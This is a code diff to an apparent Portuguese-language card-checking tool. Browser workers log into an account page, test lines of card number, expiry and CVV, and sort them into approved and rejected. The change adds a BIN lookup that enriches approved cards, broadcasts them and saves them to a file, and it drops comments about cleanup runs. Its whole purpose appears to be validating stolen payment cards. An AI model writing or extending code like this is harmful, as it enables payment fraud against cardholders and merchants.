@@ -23,6 +23,7 @@ from auth_unimar import (
     URL_MEUS_CARTOES,
     USER_AGENT,
 )
+from bin_lookup import consultar_bin, formatar_cartao_aprovado
 
 load_dotenv()
 
@@ -622,10 +623,21 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                     continue
 
                 if resultado == "aprovado":
-                    log(app, f"[Canal {id_worker}][{indice}] ✅ APROVADO")
-                    await broadcast(app, "aprovado", {"cartao": linha})
+                    bin_info = await consultar_bin(numero)
+                    linha_formatada = formatar_cartao_aprovado(
+                        numero, mes, ano, cvv, bin_info
+                    )
+                    log(app, f"[Canal {id_worker}][{indice}] ✅ APROVADO -> {linha_formatada}")
+                    await broadcast(
+                        app,
+                        "aprovado",
+                        {
+                            "cartao": linha_formatada,
+                            "bin": bin_info,
+                        },
+                    )
                     await inc_estado("aprovados", 1)
-                    await asyncio.to_thread(_escrever_aprovado, linha)
+                    await asyncio.to_thread(_escrever_aprovado, linha_formatada)
                     await inc_estado("tarefas_concluidas", 1)
                 elif resultado == "reprovado" or resultado.startswith("reprovado:"):
                     motivo = resultado.split(":", 1)[1].strip() if ":" in resultado else ""
@@ -741,7 +753,6 @@ async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: Fast
                     log(app, "[ERRO] Falha na autenticação")
                     return
 
-                # Faxina inicial antes de começar os testes
                 await _executar_faxina_em_contexto(browser, app)
 
                 tasks = [
@@ -750,7 +761,6 @@ async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: Fast
                 ]
                 await asyncio.gather(*tasks, return_exceptions=True)
 
-                # Faxina final obrigatória após todos os testes e filas concluídas
                 log(app, "[Sistema] Executando faxina final...")
                 await _executar_faxina_em_contexto(
                     browser, app, ignorar_cancelamento=True
